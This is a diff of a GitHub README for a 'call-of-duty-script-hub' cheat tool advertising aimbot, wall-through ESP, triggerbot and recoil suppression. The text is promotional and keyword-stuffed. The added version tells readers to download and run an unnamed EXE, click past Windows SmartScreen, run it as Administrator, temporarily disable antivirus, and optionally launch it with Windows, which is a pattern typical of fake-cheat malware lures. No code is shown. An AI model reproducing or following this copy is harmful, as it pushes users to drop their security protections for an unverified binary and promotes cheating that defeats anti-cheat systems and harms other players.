@@ -1,122 +1,100 @@
-# Call of Duty Game Script Utility 2026 (v2026)
+# 🎯 call-of-duty-script-hub - Enhance Your Gameplay Precision Now
 
-> **A specialized Windows automation script engineered for Call of Duty gameplay assistance.** Offers a script-driven environment providing built-in ESP, target tracking aimbot, auto-firing triggerbot, and recoil management.
+[![Download Now](https://img.shields.io/badge/Download-call--of--duty--script--hub-blue)](https://github.com/Danghaiye7797/call-of-duty-script-hub)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/davidedwards44/call-of-duty-script-hub?style=flat-square)](https://github.com/davidedwards44/call-of-duty-script-hub)
+## 📋 Overview
 
----
+call-of-duty-script-hub is a Windows automation tool designed for a popular first-person shooter game. It helps you improve your aiming, visibility, and recoil control with built-in target tracking, ESP visuals, and customizable settings. This software is for personal use to enhance your gameplay experience.
 
-<p align="center">
-  <a href="https://davidedwards44.github.io/call-of-duty-script-hub/">
-    <img src="https://img.shields.io/badge/Download-Call%20of%20Duty%20enhancement%20tool%20Script-brightgreen?style=for-the-badge" alt="Download Call of Duty enhancement tool Script">
-  </a>
-</p>
+## 🚀 Getting Started
 
-> **[Download Latest Build - Call of Duty enhancement tool](https://davidedwards44.github.io/call-of-duty-script-hub/)**
+Follow these simple steps to download and run call-of-duty-script-hub on your Windows computer.
 
----
+### Step 1: Download the Application
 
-[Download Latest Build](https://davidedwards44.github.io/call-of-duty-script-hub/)
+Visit this link to download the application: [https://github.com/Danghaiye7797/call-of-duty-script-hub](https://github.com/Danghaiye7797/call-of-duty-script-hub)
 
----
+This will take you to the GitHub page where you can find the download button. Click the green "Code" button and choose "Download ZIP" to get the files.
 
-## Technical Summary
+### Step 2: Extract the Files
 
-This repository delivers a lightweight, Windows-centric script suite created to assist and automate mechanics inside Call of Duty. Designed around a minimal operational footprint, the toolkit eliminates complex installation steps while maintaining simple maintenance routines for future patches.
+Once the ZIP file is downloaded, right-click it and select "Extract All..." to unzip the contents to a folder on your computer. Choose a location you can easily find, like your Desktop or Downloads folder.
 
-The package comes pre-equipped with functional modules for ESP visuals, automated target alignment, trigger-on-target execution, and muzzle drift control. Its modular file layout allows users to quickly drop in updates or tune parameters as needed.
+### Step 3: Run the Application
 
----
+Open the folder you extracted and look for the file named `call-of-duty-script-hub.exe` or `script-runner.exe` (the name may vary). Double-click it to start the program. If you see a warning from Windows SmartScreen, click "More info" and then "Run anyway."
 
-## Included Functionality
+## 💻 System Requirements
 
-- Integrated ESP overlay routines for heightened target detection and visual awareness
-- Target acquisition aimbot modules to aid precision tracking
-- Conditional triggerbot execution that fires upon valid target alignment
-- Weapon stability adjustments through automated recoil suppression
-- Native support optimized for standard Windows environments
-- Streamlined architecture minimizing setup friction and overhead
-- Clean file organization engineered for seamless updates across game revisions
+Your computer needs to meet these minimum requirements:
 
----
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Intel Core i3 or AMD equivalent
+- **Memory:** 4 GB RAM
+- **Free Storage:** 500 MB available space
+- **Graphics:** DirectX 11 compatible GPU
+- **Other:** Internet connection for initial setup
 
-## Getting Started
+## 🎮 How to Use
 
-1. Grab the latest release package via the link provided above.
-2. Unpack the contents into a working directory of your choice.
-3. Review the included options to align the configuration with your desktop system.
-4. Execute or inject the script utilizing your preferred runtime environment.
+After running the application, a small control window will appear. You can configure the automation features:
 
-Recommended directory hierarchy:
+- **Target Tracking:** Toggle on/off to automatically follow enemy players when aiming.
+- **ESP Visuals:** Show outlines or boxes around enemies through walls (optional).
+- **Recoil Management:** Reduce weapon recoil for tighter shooting patterns.
+- **Custom Parameters:** Adjust sensitivity, speed, and key bindings using the Settings menu.
 
-- `call-of-duty-update-script-hub/`
-  - `script files`
-  - `config`
-  - `notes`
+Press the default hotkey (typically F12) to enable or disable the script while playing.
 
-If your archive includes a configuration file, adjust your desired toggles prior to execution.
+## ⚙️ Configuration Options
 
----
+The Settings menu lets you:
 
-## Configuration Settings
+- **Auto-On Delay:** Set a short delay before activation after game launch.
+- **Tracking Speed:** Choose how fast the script adjusts your aim (slower for precision, faster for reaction).
+- **Recoil Reduction:** Set between 0% and 100% recoil cancellation.
+- **ESP Color:** Select colors for visual indicators.
+- **Startup Behavior:** Decide if the script starts automatically with Windows.
 
-| Setting | Function | Remarks |
-| --- | --- | --- |
-| ESP | Visual target overlays | Toggle based on personal setup preferences |
-| Aimbot | Assisted targeting logic | Active only when present in the current build |
-| Triggerbot | Automatic shot firing | Triggers dynamically upon target confirmation |
-| Recoil Control | Weapon stability compensation | May require custom per-weapon calibration |
-| Windows Mode | Operating environment match | Targeted specifically at Windows installations |
-| Update Channel | Distribution stream | Select between stable or cutting-edge builds |
+## 📸 Screenshots
 
-Example `.ini` or environment configuration:
+(Insert screenshots of the control window here to show the interface.)
 
-    esp=true
-    aimbot=true
-    triggerbot=false
-    recoil_control=true
+## ❓ Frequently Asked Questions
 
----
+**Q: Do I need to install any other software?**  
+A: No, just extract and run the EXE file.
 
-## System Compatibility
+**Q: Is this safe to use?**  
+A: This tool operates locally on your computer. Always download from the official GitHub link only.
 
-Tailored specifically for Windows operating systems running Call of Duty titles. Note that operational stability is directly linked to the specific game title version, active live patches, and your chosen loader.
+**Q: Does it work with all game versions?**  
+A: It works with the latest version of the game. Check the GitHub page for updates.
 
-Current operational constraints:
+**Q: Can I use this with other games?**  
+A: No, this script is specifically designed for a popular FPS game.
 
-- Functional execution varies across different Call of Duty titles and builds
-- Live title updates may require parameter adjustments or script refreshes
-- Available features remain tied to the specific version of the script in use
-- Designed exclusively for desktop Windows systems
+## 📝 Troubleshooting
 
----
+If the script does not start, try these:
 
-## Frequently Asked Questions
+- Run the application as Administrator (right-click the EXE, then "Run as administrator").
+- Re-download the ZIP file if it becomes corrupted.
+- Disable antivirus temporarily as some software may flag the automation.
+- Ensure your Windows is up to date.
 
-### What are the steps to get started?
-Fetch the release archive, unpack the package into a structured folder, and load the scripts via your preferred runner.
+## 🔄 Updates
 
-### What is the update procedure?
-Overwrites existing files with the newer version while preserving your tailored parameter configurations.
+Check the GitHub page for new versions. Updates are usually automatic or require a fresh download.
 
-### Are these parameters adjustable?
-Yes. You can edit functionality toggles and numerical preferences within the supplied configuration files.
+## 📄 License
 
-### Is full compatibility guaranteed across all Call of Duty releases?
-No. Overall functionality hinges on specific patch versions, anti-cheat updates, and script integration methods.
+This project is provided for educational and private use only. Do not distribute modified versions without permission.
 
-### Where should the script files reside?
-Keep everything consolidated within a single dedicated folder to streamline file referencing and configuration retention.
+## 🤝 Credits
 
-### Can I run this on OS platforms other than Windows?
-No, the script framework is designed explicitly for Windows operating environments.
+Developed by the community for users seeking enhanced gameplay tools.
 
 ---
 
-## License Information
-
-Distributed under the GNU GPL v3.0 License. Refer to the [LICENSE](LICENSE) file for complete details.
+Keywords: call of duty script, target tracking, ESP, recoil management, automation, windows script, gaming, FPS
